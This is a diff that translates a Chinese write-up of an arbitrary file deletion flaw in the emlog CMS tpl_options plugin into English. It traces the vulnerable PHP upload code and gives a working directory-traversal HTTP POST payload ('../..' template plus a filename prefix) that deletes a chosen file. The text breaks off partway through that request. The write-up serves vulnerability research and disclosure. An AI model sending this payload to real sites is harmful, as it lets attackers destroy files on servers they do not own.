@@ -1,8 +1,9 @@
-## 任意文件删除 tpl_options.php
+## Arbitrary File Deletion `tpl_options.php`
 
-### 调试分析
+### Debugging Analysis
 
-漏洞文件在`content\plugins\tpl_options\tpl_options.php`的`upload()`方法
+The vulnerability is in the `upload()` method of the file located at `content\plugins\tpl_options\tpl_options.php`:
+
 ```php
  private function upload($template, $file, $target)
     {
@@ -15,26 +16,26 @@
         );
         if ($file['error'] == 1) {
             $result['code'] = 100;
-            $result['msg'] = '文件大小超过系统限制';
+            $result['msg'] = 'File size exceeds system limit';
             return $result;
         }
 
         if ($file['error'] > 1) {
             $result['code'] = 101;
-            $result['msg'] = '上传文件失败';
+            $result['msg'] = 'File upload failed';
             return $result;
         }
         $extension = getFileSuffix($file['name']);
         if (!in_array($extension, $this->_imageTypes)) {
             $result['code'] = 102;
-            $result['msg'] = '错误的文件类型';
+            $result['msg'] = 'Invalid file type';
             return $result;
         }
         $maxSize = defined(UPLOAD_MAX_SIZE) ? UPLOAD_MAX_SIZE : 2097152;
 
         if ($file['size'] > $maxSize) {
             $result['code'] = 103;
-            $result['msg'] = '文件大小超出系统限制';
+            $result['msg'] = 'File size exceeds system limit';
             return $result;
         }
         $uploadPath = Option::UPLOADFILE_PATH . self::ID . "/$template/";
@@ -57,122 +58,132 @@
             $ret = @mkdir($uploadPath, 0777, true);
             if ($ret === false) {
                 $result['code'] = 104;
-                $result['msg'] = '创建文件上传目录失败';
+                $result['msg'] = 'Failed to create upload directory';
                 return $result;
             }
         }
         if (@is_uploaded_file($file['tmp_name'])) {
             if (@!move_uploaded_file($file['tmp_name'], $attachpath)) {
                 $result['code'] = 105;
-                $result['msg'] = '上传失败。文件上传目录(content/uploadfile)不可写';
+                $result['msg'] = 'Upload failed. The file upload directory (content/uploadfile) is not writable';
                 return $result;
             }
             @chmod($attachpath, 0777);
         }
         return $result;
     }
-
 ```
 
-我们追踪寻找发现`setting()`方法调用了`upload()`，并且`$template`,`$target`俩参数都可传参控制
+We traced and found that the `setting()` method calls `upload()`, and both `$template` and `$target` parameters are controllable by user input:
+
 ```php
- public function setting()
-    {
-        $do = $this->arrayGet($_GET, 'do');
+ public function setting()
+    {
+        $do = $this->arrayGet($_GET, 'do');
 
-        $template = $this->arrayGet($_GET, 'template');
+        $template = $this->arrayGet($_GET, 'template');
 
-        $code = $this->arrayGet($_GET, 'code');
+        $code = $this->arrayGet($_GET, 'code');
 
-        $msg = $this->arrayGet($_GET, 'msg');
+        $msg = $this->arrayGet($_GET, 'msg');
 
-        $allTemplate = $this->getTemplates();
+        $allTemplate = $this->getTemplates();
 
-        if ($do != '') {
+        if ($do != '') {
 
-            if ($do == 'upload' && isset($_FILES['image'])) {
+            if ($do == 'upload' && isset($_FILES['image'])) {
 
-                $file = $_FILES['image'];
+                $file = $_FILES['image'];
 
-                $target = $this->arrayGet($_POST, 'target');
+                $target = $this->arrayGet($_POST, 'target');
 
-                $template = $this->arrayGet($_POST, 'template');
+                $template = $this->arrayGet($_POST, 'template');
 
-                $result = $this->upload($template, $file, $target);
+                $result = $this->upload($template, $file, $target);
 
-                extract($result);
+                extract($result);
 
-                $src = '';
+                $src = '';
 
-                if ($path) {
+                if ($path) {
 
-                    $path = substr($path, 3);
+                    $path = substr($path, 3);
 
-                    $src = BLOG_URL . $path;
+                    $src = BLOG_URL . $path;
 
-                }
+                }
 
-                ob_clean();
+                ob_clean();
 
-                include $this->view('upload');
+                include $this->view('upload');
 
-                exit;
-            }
-            emDirect('./template.php');
-        }
+                exit;
+            }
+            emDirect('./template.php');
+        }
 ```
 
-setting函数在`content\plugins\tpl_options\tpl_options_setting.php`中调用
+The `setting` function is called in `content\plugins\tpl_options\tpl_options_setting.php`:
+
 ```php
 function plugin_setting_view() {
 
-    TplOptions::getInstance()->setting();
+    TplOptions::getInstance()->setting();
 
 }
 ```
 
-继续追踪plugin_setting_view函数在`admin\plugin.php`中被调用，前提需要传参pugin为`tpl_options`来包含这个php文件才可以调用函数
+We continue to trace the `plugin_setting_view` function, which is called in `admin\plugin.php`. Note that the parameter `plugin` must be set to `tpl_options` for this PHP file to be included and the function to be called:
+
 ```php
-/ Load plug-in configuration page
+// Load plug-in configuration page
 
 if (empty($action) && $plugin) {
 
-    $a = "../content/plugins/$plugin/{$plugin}_setting.php";
+    $a = "../content/plugins/$plugin/{$plugin}_setting.php";
 
-    require_once "../content/plugins/$plugin/{$plugin}_setting.php";
+    require_once "../content/plugins/$plugin/{$plugin}_setting.php";
 
-    include View::getAdmView('header');
+    include View::getAdmView('header');
 
-    plugin_setting_view();
+    plugin_setting_view();
 
-    include View::getAdmView('footer');
+    include View::getAdmView('footer');
 
 }
 ```
 
-其中漏洞关键在`upload()`方法的这段代码：
+### Vulnerability Details
+
+The key vulnerability is in the `upload()` method:
+
 ```php
- $uploadPath = Option::UPLOADFILE_PATH . self::ID . "/$template/";
+ $uploadPath = Option::UPLOADFILE_PATH . self::ID . "/$template/";
 
-        $file_baseName = rtrim(str_replace(array(
-            '[',
-            ']'
-        ), '.', $target), '.');
+        $file_baseName = rtrim(str_replace(array(
+            '[',
+            ']'
+        ), '.', $target), '.');
 
-        $fileName = $file_baseName . '_' . uniqid() . '.' . $extension;
-        $exists_files = glob($uploadPath . $file_baseName . '*');
-        if (count($exists_files)) {
-            unlink($exists_files[0]);
-        }
+        $fileName = $file_baseName . '_' . uniqid() . '.' . $extension;
+        $exists_files = glob($uploadPath . $file_baseName . '*');
+        if (count($exists_files)) {
+            unlink($exists_files[0]);
+        }
 ```
-使用 `glob()` 函数在指定的目录（`$uploadPath`）中查找所有匹配 `$file_baseName` 前缀的文件。`*` 表示通配符，查找所有以 `$file_baseName` 为开头的文件。然后删除匹配到的第一个文件。
 
-其中变量`template`和`target`是用户可控的传参，之后经过拼接，那么我们可以目录穿越来删除任意文件。我们构造target为空或者某个字符，就可以匹配到文件。
-### 漏洞攻击
-我们先在content下创建一个`secret.txt
-![png](./public/2-1.png)`
+The `glob()` function is used to search for all files matching the `$file_baseName` prefix in the specified directory (`$uploadPath`). The `*` wildcard matches all files that start with `$file_baseName`. If any files are found, the first matching file is deleted using `unlink()`.
 
-那么我们可以构造payload，让template为`../..`穿越两层目录到content，然后target为首字母s即可匹配到`secret.txt`:
+The `$template` and `$target` variables are user-controlled inputs, which after concatenation allow for directory traversal, potentially deleting arbitrary files. By manipulating the `target` parameter (for example, setting it to an empty string or a specific character), we can match and delete arbitrary files.
+
+### Exploiting the Vulnerability
+
+First, we create a `secret.txt` file under the `content` directory:
+
+![png](./public/2-1.png)
+
+We can then craft a payload where the `template` parameter is set to `../..` (which traverses two directories up to `content`), and the `target` is set to the first letter `s`, which matches the `secret.txt` file:
+
 ```http
 POST /emlog/admin/plugin.php?plugin=tpl_options&token=f84d7b2cb44f1c6839816ca0f028ef1a35d66d2e&filter=&do=upload HTTP/1.1
 
@@ -185,9 +196,11 @@ Content-Disposition: form-data; name="template"
 
 ../..
 ```
-注意：需要管理员token
 
-完整http包如下
+**Note**: The admin token is required.
+
+The complete HTTP request looks like this:
+
 ```http
 POST /emlog/admin/plugin.php?plugin=tpl_options&token=f84d7b2cb44f1c6839816ca0f028ef1a35d66d2e&filter=&do=upload HTTP/1.1
 Host: localhost
@@ -216,7 +229,7 @@ Content-Type: image/png
 -----------------------------26132868467189384564220341836
 Content-Disposition: form-data; name="submit"
 
-提交
+Submit
 -----------------------------26132868467189384564220341836
 Content-Disposition: form-data; name="target"
 
